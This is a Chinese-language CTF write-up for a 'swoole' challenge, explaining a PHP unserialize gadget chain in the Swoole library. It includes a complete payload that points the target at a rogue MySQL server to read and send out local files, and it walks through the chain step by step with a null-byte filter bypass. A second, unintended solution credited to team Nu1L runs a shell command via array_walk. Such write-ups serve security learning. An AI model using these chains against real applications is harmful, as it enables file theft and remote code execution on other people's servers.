# swoole

make unserialize great again!

## License

AGPL License

## Payload

在Swoole里跑：
```php
<?php
function changeProperty ($object, $property, $value)
{
    $a = new ReflectionClass($object);
    $b = $a->getProperty($property);
    $b->setAccessible(true);
    $b->setValue($object, $value);
}

// Part A

$c = new \Swoole\Database\PDOConfig();
$c->withHost('ROUGE_MYSQL_SERVER');    // your rouge-mysql-server host & port
$c->withPort(3306);
$c->withOptions([
    \PDO::MYSQL_ATTR_LOCAL_INFILE => 1,
    \PDO::MYSQL_ATTR_INIT_COMMAND => 'select 1'
]);

$a = new \Swoole\ConnectionPool(function () { }, 0, '\\Swoole\\Database\\PDOPool');
changeProperty($a, 'size', 100);
changeProperty($a, 'constructor', $c);
changeProperty($a, 'num', 0);
changeProperty($a, 'pool', new \SplDoublyLinkedList());

// Part C

$d = unserialize(base64_decode('TzoyNDoiU3dvb2xlXERhdGFiYXNlXFBET1Byb3h5Ijo0OntzOjExOiIAKgBfX29iamVjdCI7TjtzOjIyOiIAKgBzZXRBdHRyaWJ1dGVDb250ZXh0IjtOO3M6MTQ6IgAqAGNvbnN0cnVjdG9yIjtOO3M6ODoiACoAcm91bmQiO2k6MDt9'));
// This's Swoole\Database\MysqliProxy
changeProperty($d, 'constructor', [$a, 'get']);

$curl = new \Swoole\Curl\Handler('http://www.baidu.com');
$curl->setOpt(CURLOPT_HEADERFUNCTION, [$d, 'reconnect']);
$curl->setOpt(CURLOPT_READFUNCTION, [$d, 'get']);

$ret = new \Swoole\ObjectProxy(new stdClass);
changeProperty($ret, '__object', [$curl, 'exec']);


$s = serialize($ret);
$s = preg_replace_callback('/s:(\d+):"\x00(.*?)\x00/', function ($a) {
    return 's:' . ((int)$a[1] - strlen($a[2]) - 2) . ':"';
}, $s);

echo $s;
echo "\n";
```

## 解释

我找到的唯一的一个能传参的函数只有这个：https://github.com/swoole/library/blob/8eebda9cd87bf37164763b059922ab393802258b/src/core/ConnectionPool.php#L89
```php
$connection = new $this->proxy($this->constructor);
```

我又检查了一遍所有的constructor，只有MySQL还算有点用。那题就这么出好了。

### Part 1 - Rouge MySQL Server

我们先回顾一下Rouge MySQL Server的原理。当客户端向服务器发送一个类型为COM_QUERY的包来进行SQL查询时，若服务器返回一个Procotol::LOCAL_INFILE_Request请求，则客户端会读取本地文件并发送到服务器。https://dev.mysql.com/doc/internals/en/com-query-response.html#packet-Protocol::LOCAL_INFILE_Request

这意味着，如果MySQL客户端连接以后，如果没有进行任何一句包括SELECT @@version之类的查询，客户端是完全不会响应服务器的LOCAL INFILE请求的。有许多客户端，例如MySQL命令行，连接之后就会向服务器查询各类参数。但PHP的MySQL客户端连接之后是什么都不会做的，因此我们需要给MySQL客户端配置MYSQL_ATTR_INIT_COMMAND参数，让它连接之后自动向服务器发送一条SQL语句。

另外，在我使用的这个Swoole版本中，若使用mysqli，则会无视所有连接参数（见我给Swoole提的Bug：https://github.com/swoole/library/issues/34 ），因此这里只能使用PDO的MySQL类。这就是
```php
$c->withOptions([
    \PDO::MYSQL_ATTR_LOCAL_INFILE => 1,
    \PDO::MYSQL_ATTR_INIT_COMMAND => 'select 1'
]);
```
的原因

### Part 2 - SplDoublyLinkedList

读读这段代码: https://github.com/swoole/library/blob/8eebda9cd87bf37164763b059922ab393802258b/src/core/ConnectionPool.php#L57

    public function get()
    {
        if ($this->pool->isEmpty() && $this->num < $this->size) {
            $this->make();
        }
        return $this->pool->pop();
    }
    public function put($connection): void
    {
        if ($connection !== null) {
            $this->pool->push($connection);
        }
    }

$this->pool的类型是`Swoole\Coroutine\Channel`，但这个类不可被序列化。不过PHP没有运行时类型检查，找一个实现了同样接口的类就可以了。PHP的SPL 中包含着许多这样的类，例如SplStack / SplQueue等等。

### Part 3 - curl

回头看Part C这个注释所在的代码，你可以在这里调用`$a->get()`，它会返回一个`Swoole\Database\PDOPool`。这是一个连接池，只有当我们要连接的时候，这个连接池才会创建连接。因此这里实际需要调用`$a->get()->get()`。但我们没有办法进行链式调用。不过，看看这里：`PDOProxy::reconnect`(https://github.com/swoole/library/blob/8eebda9cd87bf37164763b059922ab393802258b/src/core/Database/PDOProxy.php#L88):

```php
public function reconnect(): void
{
    $constructor = $this->constructor;
    parent::__construct($constructor());
}
public function parent::__construct ($constructor)
{
    $this->__object = $object;
}
public function parent::__invoke(...$arguments)
{
    /** @var mixed $object */
    $object = $this->__object;
    return $object(...$arguments);
}
```
这说明，`__object`会在连接之后被改变。因此我们只需要找到一个办法能连续调用以下这两个函数：
```php
$a->reconnect(); // typeof this->__object = PDOPool
$a->get();
```
回头看看curl，它正好允许两个不同的callback: https://github.com/swoole/library/blob/8eebda9cd87bf37164763b059922ab393802258b/src/core/Curl/Handler.php#L736
```php
$cb = $this->headerFunction;
if ($client->statusCode > 0) {
    $row = "HTTP/1.1 {$client->statusCode} " . Status::getReasonPhrase($client->statusCode) . "\r\n";
    if ($cb) {
        $cb($this, $row);
    }
    $headerContent .= $row;
}
// ...
if ($client->body and $this->readFunction) {
    $cb = $this->readFunction;
    $cb($this, $this->outputStream, strlen($client->body));
}
```

### Part 4 - Inaccessible properties

这个大家应该都见过了。我们考虑以下代码：

```php
php > class A{public $b;protected $c;}
php > $b = new A();
php > var_dump(serialize($b));
php shell code:1:
string(35) "O:1:"A":2:{s:1:"b";N;s:4:"\000*\000c";N;}"
php >
```
private/protected的属性在序列化时会被`\x00`包裹，可见 [zend_mangle_property_name](https://github.com/php/php-src/blob/34f727e63716dfb798865289c079b017812ad03b/Zend/zend_API.c#L3595). 不过我把`\x00`ban了。你可以直接对其进行unmangle。
```php
$s = preg_replace_callback('/s:(\d+):"\x00(.*?)\x00/', function ($a) {
    return 's:' . ((int)$a[1] - strlen($a[2]) - 2) . ':"';
}, $s);
```

在PHP < 7.2时，很显然这是不可行的：
```php
php > var_dump($s);
string(32) "O:1:"A":2:{s:1:"b";N;s:1:"c";N;}"
php > var_dump(unserialize($s));
object(A)#2 (3) {
  ["b"]=>
  NULL
  ["c":protected]=>
  NULL
  ["c"]=>
  NULL
}
```
但在PHP 7.2以及以上版本中，由于这个commit的缘故，all works fine：[Fix #49649 - Handle property visibility changes on unserialization ](https://github.com/php/php-src/commit/7cb5bdf64a95bd70623d33d6ea122c13b01113bd)。


## 非预期

来自[Nu1L](https://ctftime.org/team/19208)。

```php
```php
$o = new Swoole\Curl\Handlep("http://google.com/");
$o->setOpt(CURLOPT_READFUNCTION,"array_walk");
$o->setOpt(CURLOPT_FILE, "array_walk");
$o->exec = array('whoami');
$o->setOpt(CURLOPT_POST,1);
$o->setOpt(CURLOPT_POSTFIELDS,"aaa");
$o->setOpt(CURLOPT_HTTPHEADER,["Content-type"=>"application/json"]);
$o->setOpt(CURLOPT_HTTP_VERSION,CURL_HTTP_VERSION_1_1);

$a = serialize([$o,'exec']);
echo str_replace("Handlep","Handler",urlencode(process_serialized($a)));


// process_serialized:
// use `S:` instead of `s:` to bypass \x00
```
